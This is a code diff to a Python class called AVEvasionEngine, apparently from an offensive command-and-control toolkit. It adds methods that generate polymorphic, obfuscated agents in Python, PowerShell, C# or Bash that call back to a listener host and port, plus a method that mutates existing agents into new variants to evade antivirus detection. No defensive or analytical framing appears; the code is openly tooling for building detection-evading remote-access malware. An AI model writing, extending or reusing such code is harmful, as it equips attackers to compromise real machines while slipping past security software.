@@ -9,6 +9,7 @@ import random
 import string
 import json
 from datetime import datetime
+from polymorphic_obfuscator import PolymorphicObfuscator, AgentMutator
 
 
 class AVEvasionEngine:
@@ -233,6 +234,47 @@ namespace {namespace}
             'compile_command': f'csc.exe /target:exe /out:{classname}.exe {classname}.cs',
             'compile_command_mono': f'mcs -out:{classname}.exe {classname}.cs'
         }
+    
+    def generate_polymorphic_agent(self, lhost, lport, agent_type='python', obfuscation_level='high'):
+        """
+        Generate a polymorphic obfuscated agent
+        
+        Args:
+            lhost: Listener host IP
+            lport: Listener port
+            agent_type: Type of agent ('python', 'powershell', 'csharp', 'bash')
+            obfuscation_level: 'low', 'medium', 'high', 'extreme'
+        
+        Returns:
+            Dict with agent code and metadata
+        """
+        obfuscator = PolymorphicObfuscator(obfuscation_level=obfuscation_level)
+        
+        if agent_type.lower() == 'python':
+            return obfuscator.obfuscate_python("", lhost, lport)
+        elif agent_type.lower() == 'powershell':
+            return obfuscator.obfuscate_powershell(lhost, lport)
+        elif agent_type.lower() == 'csharp':
+            return obfuscator.obfuscate_csharp(lhost, lport)
+        elif agent_type.lower() == 'bash':
+            return obfuscator.obfuscate_bash(lhost, lport)
+        else:
+            raise ValueError(f"Unsupported agent type: {agent_type}")
+    
+    def mutate_existing_agent(self, agent_code, language, mutation_rate=0.5):
+        """
+        Mutate an existing agent to create a new variant
+        
+        Args:
+            agent_code: Original agent code
+            language: Programming language
+            mutation_rate: How much to mutate (0.0 to 1.0)
+        
+        Returns:
+            Mutated agent code
+        """
+        mutator = AgentMutator()
+        return mutator.mutate_agent(agent_code, language, mutation_rate)
     
     def detect_agent_type(self, initial_response, connection_behavior):
         """
